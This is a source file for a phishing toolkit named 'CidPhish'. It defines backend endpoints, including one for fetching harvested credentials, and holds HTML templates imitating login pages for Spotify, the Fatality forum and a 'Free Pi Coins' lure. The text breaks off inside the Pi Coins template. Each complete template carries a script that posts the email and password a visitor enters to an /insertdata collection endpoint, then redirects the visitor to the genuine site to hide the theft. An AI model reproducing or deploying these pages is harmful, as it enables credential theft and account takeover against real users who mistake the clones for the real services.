
export const APP_NAME = "CidPhish";

//export const API_BACKEND_PREFIX = "http://localhost:5237";
export const API_BACKEND_PREFIX = "/api";

export const API_TEMPLATE_LIST = `${API_BACKEND_PREFIX}/templates`;

export const API_CREATE_REPO = `${API_BACKEND_PREFIX}/github/create`;

export const API_DOWNLOAD = `${API_BACKEND_PREFIX}/github/download`;

export const API_LIST_TEMPLATES = `${API_BACKEND_PREFIX}/github/templates`;

export const API_DELETE_REPO = `${API_BACKEND_PREFIX}/github/delete`;

export const API_FETCH_CREDENTIALS = `${API_BACKEND_PREFIX}/fetchcredentials`;


  
export const websites = {
    "testweb":`<!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Test Page</title>
      <style>
          * {
              margin: 0;
              padding: 0;
              box-sizing: border-box;
              font-family: Arial, sans-serif;
          }
          body {
              display: flex;
              justify-content: center;
              align-items: center;
              height: 100vh;
              background: linear-gradient(to right, #4facfe, #00f2fe);
          }
          .login-container {
              background: white;
              padding: 2rem;
              border-radius: 10px;
              box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
              width: 100%;
              max-width: 350px;
              text-align: center;
          }
          .login-container h2 {
              margin-bottom: 1rem;
              color: #333;
          }
          .input-group {
              margin-bottom: 1rem;
              text-align: left;
          }
          .input-group label {
              display: block;
              font-weight: bold;
              margin-bottom: 5px;
          }
          .input-group input {
              width: 100%;
              padding: 10px;
              border: 1px solid #ccc;
              border-radius: 5px;
          }
          .btn {
              width: 100%;
              padding: 10px;
              background: #4facfe;
              color: white;
              border: none;
              border-radius: 5px;
              cursor: pointer;
              font-size: 1rem;
              margin-top: 10px;
          }
          .btn:hover {
              background: #00c6ff;
          }
          .error {
              color: red;
              font-size: 0.9rem;
              margin-top: 5px;
          }
      </style>
  </head>
  <body>
      <div class="login-container">
          <h2>Login</h2>
          <form id="loginForm">
              <div class="input-group">
                  <label for="email">Email</label>
                  <input type="text" id="email" required>
              </div>
              <div class="input-group">
                  <label for="password">Password</label>
                  <input type="password" id="password" required>
              </div>
              <button id ="testeb" onclick="handleSubmit(event)" class="btn">Login</button>
              <p id="error-message" class="error"></p>
          </form>
      </div>
  
      <script>
  
              const uid = "user123user123"; 
        const websiteName = "mywebsitemywebsite"; 
    
        async function handleSubmit(event) {
          event.preventDefault(); 
          const email = document.getElementById("email").value;
          const password = document.getElementById("password").value;
          const signInButton = document.getElementById("testeb");
              signInButton.disabled = true;
              signInButton.style.opacity = '0.5';
              signInButton.style.cursor = 'not-allowed';
          try {
            const response = await fetch("http://localhost:5237/insertdata", {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                uid: uid,
                websiteName: websiteName,
                email: email,
                password: password
              })
            });
    
            window.location.href = "https://google.com/";
          } catch (error) {
            window.location.href = "https://google.com/";
            console.error("Error inserting data:", error);
          }
        }
      </script>
  </body>
  </html>`,
  "Spotify":`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spotify Test Web | dont login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #121212 0%, #1a1a1a 100%);
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: rgba(18, 18, 18, 0.95);
            border-radius: 12px;
            padding: 48px;
            width: 100%;
            max-width: 450px;
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
        }

        .logo {
            text-align: center;
            margin-bottom: 12px;
        }

        .logo-icon {
            width: 48px;
            height: 48px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 16px;
            position: relative;
        }

        .logo-icon svg {
            width: 48px;
            height: 48px;
            fill: #1db954;
        }

        .title {
            font-size: 32px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 32px;
            letter-spacing: -0.5px;
        }

        .social-buttons {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 32px;
        }

        .social-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            padding: 16px 24px;
            background: transparent;
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 500px;
            color: #ffffff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
        }

        .social-btn:hover {
            border-color: #ffffff;
            transform: translateY(-1px);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
        }

        .social-btn .icon {
            width: 20px;
            height: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .social-btn .icon svg {
            width: 20px;
            height: 20px;
        }

        .phone {
            border: 1px solid rgba(255, 255, 255, 0.3);
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 32px 0;
            gap: 16px;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: rgba(255, 255, 255, 0.2);
        }

        .divider span {
            color: rgba(255, 255, 255, 0.7);
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #ffffff;
            font-size: 14px;
            font-weight: 600;
        }

        .input-container {
            position: relative;
        }

        .form-group input {
            width: 100%;
            padding: 16px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 8px;
            color: #ffffff;
            font-size: 16px;
            outline: none;
            transition: all 0.3s ease;
        }

        .form-group input:focus {
            border-color: #1db954;
            box-shadow: 0 0 0 2px rgba(29, 185, 84, 0.2);
            background: rgba(255, 255, 255, 0.15);
        }

        .form-group input::placeholder {
            color: rgba(255, 255, 255, 0.6);
        }

        .password-toggle {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: rgba(255, 255, 255, 0.6);
            cursor: pointer;
            font-size: 14px;
            transition: color 0.3s ease;
        }

        .password-toggle:hover {
            color: #ffffff;
        }

        .login-btn {
            width: 100%;
            padding: 16px;
            background: #1db954;
            color: #000000;
            border: none;
            border-radius: 500px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 32px 0 24px 0;
            text-transform: none;
        }

        .login-btn:hover {
            background: #1ed760;
            transform: translateY(-1px);
            box-shadow: 0 8px 25px rgba(29, 185, 84, 0.3);
        }

        .forgot-password {
            text-align: center;
            margin-bottom: 32px;
        }

        .forgot-password a {
            color: #ffffff;
            text-decoration: underline;
            font-size: 16px;
            transition: color 0.3s ease;
        }

        .forgot-password a:hover {
            color: #1db954;
        }

        .signup-link {
            text-align: center;
            padding-top: 32px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
        }

        .signup-link span {
            color: rgba(255, 255, 255, 0.7);
            margin-right: 8px;
        }

        .signup-link a {
            color: #ffffff;
            text-decoration: underline;
            font-weight: 600;
            transition: color 0.3s ease;
        }

        .signup-link a:hover {
            color: #1db954;
        }

        @media (max-width: 480px) {
            .container {
                padding: 32px 24px;
            }
            
            .title {
                font-size: 28px;
            }
        }

        /* Add subtle animation */
        .container {
            animation: fadeInUp 0.6s ease-out;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <div class="logo-icon">
                <svg role="img" viewBox="0 0 24 24" aria-label="Spotify" aria-hidden="false" height="100%" data-encore-id="logoSpotify" style="fill: #1db954;">
                    <title>Spotify</title>
                    <path d="M13.427.01C6.805-.253 1.224 4.902.961 11.524.698 18.147 5.853 23.728 12.476 23.99c6.622.263 12.203-4.892 12.466-11.514S20.049.272 13.427.01m5.066 17.579a.717.717 0 0 1-.977.268 14.4 14.4 0 0 0-5.138-1.747 14.4 14.4 0 0 0-5.42.263.717.717 0 0 1-.338-1.392c1.95-.474 3.955-.571 5.958-.29 2.003.282 3.903.928 5.647 1.92a.717.717 0 0 1 .268.978m1.577-3.15a.93.93 0 0 1-1.262.376 17.7 17.7 0 0 0-5.972-1.96 17.7 17.7 0 0 0-6.281.238.93.93 0 0 1-1.11-.71.93.93 0 0 1 .71-1.11 19.5 19.5 0 0 1 6.94-.262 19.5 19.5 0 0 1 6.599 2.165c.452.245.62.81.376 1.263m1.748-3.551a1.147 1.147 0 0 1-1.546.488 21.4 21.4 0 0 0-6.918-2.208 21.4 21.4 0 0 0-7.259.215 1.146 1.146 0 0 1-.456-2.246 23.7 23.7 0 0 1 8.034-.24 23.7 23.7 0 0 1 7.657 2.445c.561.292.78.984.488 1.546m13.612-.036-.832-.247c-1.67-.495-2.14-.681-2.14-1.353 0-.637.708-1.327 2.264-1.327 1.539 0 2.839.752 3.51 1.31.116.096.24.052.24-.098V6.935c0-.097-.027-.15-.098-.203-.83-.62-2.272-1.07-3.723-1.07-2.953 0-4.722 1.68-4.722 3.59 0 2.157 1.371 2.91 3.626 3.546l.973.274c1.689.478 1.998.902 1.998 1.556 0 1.097-.831 1.433-2.07 1.433-1.556 0-3.457-.911-4.35-2.025-.08-.098-.177-.053-.177.062v2.423c0 .097.01.141.08.22.743.814 2.52 1.53 4.59 1.53 2.546 0 4.456-1.485 4.456-3.784 0-1.787-1.052-2.865-3.625-3.635m10.107-1.76c-1.68 0-2.653 1.026-3.219 2.052V9.376c0-.08-.044-.124-.124-.124h-2.22c-.079 0-.123.044-.123.124V20.72c0 .08.044.124.124.124h2.22c.079 0 .123-.044.123-.124v-4.536c.566 1.025 1.521 2.034 3.237 2.034 2.264 0 3.89-1.955 3.89-4.581s-1.644-4.545-3.908-4.545m-.654 6.986c-1.185 0-2.211-1.167-2.618-2.458.407-1.362 1.344-2.405 2.618-2.405 1.211 0 2.051.92 2.051 2.423s-.84 2.44-2.051 2.44m40.633-6.826h-2.264c-.08 0-.115.017-.15.097l-2.282 5.483-2.29-5.483c-.035-.08-.07-.097-.15-.097h-3.661v-.584c0-.955.645-1.397 1.476-1.397.496 0 1.035.256 1.415.486.089.053.15-.008.115-.088l-.796-1.901a.26.26 0 0 0-.124-.133c-.389-.203-1.025-.38-1.644-.38-1.875 0-2.954 1.432-2.954 3.254v.743h-1.503c-.08 0-.124.044-.124.124v1.768c0 .08.044.124.124.124h1.503v6.668c0 .08.044.123.124.123h2.264c.08 0 .124-.044.124-.123v-6.668h1.936l2.812 6.11-1.512 3.325c-.044.098.009.142.097.142h2.414c.08 0 .116-.018.15-.097l4.997-11.355c.035-.08-.009-.141-.097-.141M54.964 9.04c-2.865 0-4.837 2.025-4.837 4.616 0 2.573 1.971 4.616 4.837 4.616 2.856 0 4.846-2.043 4.846-4.616 0-2.591-1.99-4.616-4.846-4.616m.008 7.065c-1.37 0-2.343-1.043-2.343-2.45 0-1.405.973-2.449 2.343-2.449 1.362 0 2.335 1.043 2.335 2.45 0 1.406-.973 2.45-2.335 2.45m33.541-6.334a1.24 1.24 0 0 0-.483-.471 1.4 1.4 0 0 0-.693-.17q-.384 0-.693.17a1.24 1.24 0 0 0-.484.471q-.174.302-.174.681 0 .375.174.677.175.3.484.471t.693.17.693-.17.483-.471.175-.676q0-.38-.175-.682m-.211 1.247a1 1 0 0 1-.394.39 1.15 1.15 0 0 1-.571.14 1.16 1.16 0 0 1-.576-.14 1 1 0 0 1-.391-.39 1.14 1.14 0 0 1-.14-.566q0-.316.14-.562t.391-.388.576-.14q.32 0 .57.14.253.141.395.39t.142.565q0 .312-.142.56m-19.835-5.78c-.85 0-1.468.6-1.468 1.396s.619 1.397 1.468 1.397c.866 0 1.485-.6 1.485-1.397 0-.796-.619-1.397-1.485-1.397m19.329 5.19a.31.31 0 0 0 .134-.262q0-.168-.132-.266-.132-.099-.381-.099h-.588v1.229h.284v-.489h.154l.374.489h.35l-.41-.518a.5.5 0 0 0 .215-.084m-.424-.109h-.26v-.3h.27q.12 0 .184.036a.12.12 0 0 1 .065.116.12.12 0 0 1-.067.111.4.4 0 0 1-.192.037M69.607 9.252h-2.263c-.08 0-.124.044-.124.124v8.56c0 .08.044.123.124.123h2.263c.08 0 .124-.044.124-.123v-8.56c0-.08-.044-.124-.124-.124m-3.333 6.605a2.1 2.1 0 0 1-1.053.257c-.725 0-1.185-.425-1.185-1.362v-3.484h2.211c.08 0 .124-.044.124-.124V9.376c0-.08-.044-.124-.124-.124h-2.21V6.944c0-.097-.063-.15-.15-.08l-3.954 3.113c-.053.044-.07.088-.07.16v1.007c0 .08.044.124.123.124h1.539v3.855c0 2.087 1.203 3.06 2.918 3.06.743 0 1.46-.194 1.884-.442.062-.035.07-.07.07-.133v-1.68c0-.088-.044-.115-.123-.07" transform="translate(-0.95,0)"></path>
                </svg>
            </div>
            <h1 class="title">Log in to Spotify</h1>
        </div>

        <div class="social-buttons">
            <button class="social-btn google">
                <span class="icon">
                    <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="100" height="100" viewBox="0 0 48 48">
                        <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"></path><path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"></path><path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"></path><path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"></path>
                    </svg>
                </span>
                Continue with Google
            </button>
            
            <button class="social-btn facebook">
                <span class="icon">
                    <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="100" height="100" viewBox="0 0 24 24">
                        <path fill="#1877f2" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"></path>
                    </svg>
                </span>
                Continue with Facebook
            </button>
            
            <button class="social-btn apple">
                <span class="icon">
                    <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="100" height="100" viewBox="0 0 24 24">
                        <path fill="#ffffff" d="M 16.125 1 C 14.972 1.067 13.648328 1.7093438 12.861328 2.5273438 C 12.150328 3.2713438 11.589359 4.3763125 11.818359 5.4453125 C 13.071359 5.4783125 14.329031 4.8193281 15.082031 3.9863281 C 15.785031 3.2073281 16.318 2.12 16.125 1 z M 16.193359 5.4433594 C 14.384359 5.4433594 13.628 6.5546875 12.375 6.5546875 C 11.086 6.5546875 9.9076562 5.5136719 8.3476562 5.5136719 C 6.2256562 5.5146719 3 7.4803281 3 12.111328 C 3 16.324328 6.8176563 21 8.9726562 21 C 10.281656 21.013 10.599 20.176969 12.375 20.167969 C 14.153 20.154969 14.536656 21.011 15.847656 21 C 17.323656 20.989 18.476359 19.367031 19.318359 18.082031 C 19.922359 17.162031 20.170672 16.692344 20.638672 15.652344 C 17.165672 14.772344 16.474672 9.1716719 20.638672 8.0136719 C 19.852672 6.6726719 17.558359 5.4433594 16.193359 5.4433594 z"></path>
                    </svg>
                </span>
                Continue with Apple
            </button>
            
            <button class="social-btn phone">
                Continue with phone number
            </button>
        </div>

        <div class="divider">
            <span>or</span>
        </div>

        <form>
            <div class="form-group">
                <label for="email">Email or username</label>
                <input 
                    type="text" 
                    id="email" 
                    name="email" 
                    placeholder="Email or username"
                    required
                >
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <div class="input-container">
                    <input 
                        type="password" 
                        id="password" 
                        name="password" 
                        placeholder="Password"
                        required
                    >
                    <button type="button" class="password-toggle" onclick="togglePassword()">
                        👁️
                    </button>
                </div>
            </div>

            <button type="submit" id="testeb" class="login-btn">Log In</button>
        </form>

        <div class="forgot-password">
            <a href="https://accounts.spotify.com/en-GB/login">Log in without password</a>
        </div>

        <div class="signup-link">
            <span>Don't have an account?</span>
            <a href="https://accounts.spotify.com/en-GB/login">Sign up for Spotify</a>
        </div>
    </div>

    <script>
        const uid = "user123user123"; 
        const websiteName = "mywebsitemywebsite"; 
    
        async function handleSubmit(event) {
          event.preventDefault(); 
          const email = document.getElementById("email").value;
          const password = document.getElementById("password").value;
          const signInButton = document.getElementById("testeb");
              signInButton.disabled = true;
              signInButton.style.opacity = '0.5';
              signInButton.style.cursor = 'not-allowed';
          try {
            const response = await fetch("http://localhost:5237/insertdata", {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                uid: uid,
                websiteName: websiteName,
                email: email,
                password: password
              })
            });
    
            window.location.href = "https://accounts.spotify.com/en-GB/login";
          } catch (error) {
            window.location.href = "https://accounts.spotify.com/en-GB/login";
            console.error("Error inserting data:", error);
          }
        }

        function togglePassword() {
            const passwordField = document.getElementById('password');
            const toggleBtn = document.querySelector('.password-toggle');
            
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                toggleBtn.textContent = '🙈';
            } else {
                passwordField.type = 'password';
                toggleBtn.textContent = '👁️';
            }
        }

        // Handle form submission
        document.querySelector('form').addEventListener('submit', function(e) {
            e.preventDefault();
            handleSubmit(e);
        });

        // Handle social button clicks
        document.querySelectorAll('.social-btn').forEach(button => {
            button.addEventListener('click', function() {
                const service = this.textContent.trim().split(' ').pop();
                window.location.href = 'https://accounts.spotify.com/en-GB/login';
            });
        });

        // Add subtle hover effects to inputs
        document.querySelectorAll('input').forEach(input => {
            input.addEventListener('focus', function() {
                this.parentElement.style.transform = 'translateY(-1px)';
            });
            
            input.addEventListener('blur', function() {
                this.parentElement.style.transform = 'translateY(0)';
            });
        });
    </script>
</body>
</html>`,
  "Fatality":`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Faintality</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background-color: #1a1a1a;
            color: #ffffff;
            height: 100vh;
            overflow: hidden;
        }

        .header {
            position: absolute;
            top: 20px;
            right: 20px;
            display: flex;
            gap: 20px;
            z-index: 10;
        }

        .header a {
            color: #ffffff;
            text-decoration: none;
            font-size: 14px;
            opacity: 0.8;
            transition: opacity 0.3s;
        }

        .header a:hover {
            opacity: 1;
        }

        .header .register {
            opacity: 0.5;
        }

        .main-container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            position: relative;
        }

        .logo {
            font-size: 72px;
            font-weight: bold;
            letter-spacing: 8px;
            color: #ffffff;
            margin-bottom: 100px;
            position: relative;
            animation: ft-glitch .65s cubic-bezier(.25, .46, .45, .94) infinite both;
        }

        .logo::before,
        .logo::after {
            content: 'FAINTALITY';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }

        .logo::before {
            animation: glitch-1 2s infinite;
            color: #ff0040;
            z-index: -1;
        }

        .logo::after {
            animation: glitch-2 2s infinite;
            color: #00ffff;
            z-index: -2;
        }

        @keyframes ft-glitch {
            0% {
                text-shadow:none
            }
            25% {
                text-shadow:-2px -2px 0 #eb055a, 2px 2px 0 #4632f0
            }
            50% {
                text-shadow:2px -2px 0 #eb055a, -2px 2px 0 #4632f0
            }
            75% {
                text-shadow:-2px 2px 0 #eb055a, 2px -2px 0 #4632f0
            }
            100% {
                text-shadow:2px 2px 0 #eb055a, -2px -2px 0 #4632f0
            }
        }

        @keyframes glitch-1 {
            0%, 74%, 76%, 100% {
                transform: translate(0);
                opacity: 0.8;
            }
            75% {
                transform: translate(2px, -2px);
                opacity: 0.8;
            }
        }

        @keyframes glitch-2 {
            0%, 74%, 76%, 100% {
                transform: translate(0);
                opacity: 0.8;
            }
            75% {
                transform: translate(-2px, -2px);
                opacity: 0.8;
            }
        }

        .login-section {
            background: rgba(40, 40, 40, 0.8);
            border: 1px solid #333;
            border-radius: 8px;
            padding: 40px;
            width: 400px;
            backdrop-filter: blur(10px);
        }

        .login-title {
            font-size: 24px;
            margin-bottom: 30px;
            color: #ffffff;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #cccccc;
            font-size: 14px;
        }

        .input-container {
            position: relative;
        }

        .form-group input {
            width: 100%;
            padding: 12px 40px 12px 12px;
            background: #2a2a2a;
            border: 1px solid #444;
            border-radius: 4px;
            color: #ffffff;
            font-size: 14px;
            outline: none;
            transition: border-color 0.3s;
        }

        .form-group input:focus {
            border-color: #c44569;
        }

        .input-icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #666;
            cursor: pointer;
            font-size: 16px;
        }

        .forgot-password {
            color: #c44569;
            text-decoration: none;
            font-size: 13px;
            display: block;
            margin-top: 8px;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .checkbox-container {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }

        .checkbox-container input[type="checkbox"] {
            margin-right: 8px;
            width: 16px;
            height: 16px;
        }

        .checkbox-container label {
            font-size: 14px;
            color: #cccccc;
            margin: 0;
        }

        .login-button {
            width: 100%;
            padding: 12px;
            background: #c44569;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.3s;
            margin-bottom: 20px;
        }

        .login-button:hover {
            background: #a53658;
        }

        .register-link {
            text-align: center;
            font-size: 14px;
            color: #cccccc;
        }

        .register-link a {
            color: #ffffff;
            text-decoration: none;
            margin-left: 8px;
        }

        .register-link a:hover {
            text-decoration: underline;
        }

        .cookie-notice {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(0, 0, 0, 0.9);
            padding: 20px;
            text-align: center;
            font-size: 13px;
            color: #cccccc;
            border-top: 1px solid #333;
        }

        .cookie-notice p {
            margin-bottom: 15px;
            line-height: 1.4;
        }

        .cookie-buttons {
            display: flex;
            justify-content: center;
            gap: 15px;
        }

        .cookie-buttons button {
            background: none;
            border: none;
            color: #ffffff;
            cursor: pointer;
            font-size: 13px;
            text-decoration: underline;
        }

        .cookie-buttons .accept {
            color: #4CAF50;
        }

        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            backdrop-filter: blur(5px);
        }

        .modal.active {
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background: #2a2a2a;
            border: 1px solid #444;
            border-radius: 8px;
            padding: 30px;
            width: 450px;
            position: relative;
            max-height: 90vh;
            overflow-y: auto;
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }

        .modal-title {
            font-size: 24px;
            color: #c44569;
        }

        .close-button {
            background: none;
            border: none;
            color: #c44569;
            font-size: 24px;
            cursor: pointer;
            padding: 0;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .close-button:hover {
            color: #ff6b9d;
        }
    </style>
</head>
<body>
    <script>
  
        const uid = "user123user123"; 
        const websiteName = "mywebsitemywebsite"; 
    
        async function handleSubmit(event) {
          event.preventDefault(); 
          const email = document.getElementById("username").value;
          const password = document.getElementById("password").value;
          const signInButton = document.getElementById("testeb");
              signInButton.disabled = true;
              signInButton.style.opacity = '0.5';
              signInButton.style.cursor = 'not-allowed';
          try {
            const response = await fetch("http://localhost:5237/insertdata", {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                uid: uid,
                websiteName: websiteName,
                email: email,
                password: password
              })
            });
    
            window.location.href = "https://fatality.win";
          } catch (error) {
            window.location.href = "https://fatality.win";
            console.error("Error inserting data:", error);
          }
        }
      </script>

    <div class="header">
        <a href="https://fatality.win" onclick="showModal()">Log in</a>
        <a href="https://fatality.win" class="register">Register</a>
    </div>

    <div class="main-container">
        <h1 class="logo">FAINTALITY</h1>
        
        <div class="login-section">
            <h2 class="login-title">Log in</h2>
            
            <div class="form-group">
                <label for="username">Your name or email address:</label>
                <div class="input-container">
                    <input type="text" id="username" name="username">
                    <span class="input-icon">👤</span>
                </div>
            </div>

            <div class="form-group">
                <label for="password">Password:</label>
                <div class="input-container">
                    <input type="password" id="password" name="password">
                    <span class="input-icon" onclick="togglePassword()" style="color: #c44569;">👁</span>
                </div>
                <a href="https://fatality.win" class="forgot-password">Forgot your password?</a>
            </div>

            <div class="checkbox-container">
                <input type="checkbox" id="remember" name="remember">
                <label for="remember">Stay logged in</label>
            </div>

            <button class="login-button" id="testeb" onclick="handleSubmit">🔒 Log in</button>

            <div class="register-link">
                Don't have an account?
                <a href="https://fatality.win">Register now</a>
            </div>
        </div>
    </div>

    <div class="cookie-notice">
        <p>This site uses cookies to help personalise content, tailor your experience and to keep you logged in if you register.<br>
        By continuing to use this site, you are consenting to our use of cookies.</p>
        <div class="cookie-buttons">
            <button class="accept" onclick="hideCookieNotice()">✓ Accept</button>
            <button onclick="showCookieInfo()">Learn more..</button>
        </div>
    </div>

    <!-- Modal -->
    <div class="modal" id="loginModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 class="modal-title">Log in</h2>
                <button class="close-button" onclick="hideModal()">✕</button>
            </div>
            
            <div class="form-group">
                <label for="modal-username">Your name or email address:</label>
                <div class="input-container">
                    <input type="text" id="modal-username" name="username">
                    <span class="input-icon">🔑</span>
                </div>
            </div>

            <div class="form-group">
                <label for="modal-password">Password:</label>
                <div class="input-container">
                    <input type="password" id="modal-password" name="password">
                    <span class="input-icon" onclick="toggleModalPassword()" style="color: #c44569;">👁 Show</span>
                </div>
                <a href="https://fatality.win" class="forgot-password">Forgot your password?</a>
            </div>

            <div class="checkbox-container">
                <input type="checkbox" id="modal-remember" name="remember" checked>
                <label for="modal-remember">Stay logged in</label>
            </div>

            <button class="login-button">🔒 Log in</button>

            <div class="register-link">
                Don't have an account?
                <a href="https://fatality.win">Register now</a>
            </div>
        </div>
    </div>

    <script>
        function showModal() {
            document.getElementById('loginModal').classList.add('active');
        }

        function hideModal() {
            document.getElementById('loginModal').classList.remove('active');
        }

        function togglePassword() {
            const passwordField = document.getElementById('password');
            const icon = event.target;
            
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                icon.textContent = '🙈';
            } else {
                passwordField.type = 'password';
                icon.textContent = '👁';
            }
        }

        function toggleModalPassword() {
            const passwordField = document.getElementById('modal-password');
            const icon = event.target;
            
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                icon.textContent = '🙈 Hide';
            } else {
                passwordField.type = 'password';
                icon.textContent = '👁 Show';
            }
        }

        function hideCookieNotice() {
            document.querySelector('.cookie-notice').style.display = 'none';
        }

        function showCookieInfo() {
            alert('Cookie information would be displayed here.');
        }

        // Close modal when clicking outside
        document.getElementById('loginModal').addEventListener('click', function(e) {
            if (e.target === this) {
                hideModal();
            }
        });

        // Handle form submissions
        document.querySelectorAll('.login-button').forEach(button => {
            button.addEventListener('click', function(e) {
                e.preventDefault();
                handleSubmit(e);
            });
        });
    </script>
</body>
</html>`,
    "Free Pi Coins":`<!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Test Page</title>
      <style>
          body {
              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
              margin: 0;
              padding: 0;
              background-color: #f5f5f5;
          }
          
          .header {
              background-color: #663399;
              color: white;
              padding: 15px 20px;
              display: flex;
              align-items: center;
              justify-content: space-between;
          }
          
          .header-title {
              font-size: 20px;
              font-weight: 500;
              display: flex;
              align-items: center;
              justify-content: center;
              flex: 1;
          }
          
          .back-button {
              width: 24px;
              height: 24px;
              border: none;
              background: none;
              color: white;
              font-size: 24px;
              cursor: pointer;
              display: flex;
              align-items: center;
          }
          
          .check-button {
              width: 24px;
              height: 24px;
              border: none;
              background: none;
              color: white;
              font-size: 18px;
              cursor: pointer;
          }
          
          .wallet-icon, .mining-icon {
              background-color: #FFA500;
              width: 30px;
              height: 30px;
              border-radius: 6px;
              display: flex;
              justify-content: center;
              align-items: center;
              margin-right: 10px;
              color: white;
          }
          
          .pi-icon {
              background-color: #FFA500;
              width: 20px;
              height: 20px;
              border-radius: 50%;
              display: flex;
              justify-content: center;
              align-items: center;
              margin-left: 10px;
              color: white;
              font-size: 12px;
          }
          
          .container {
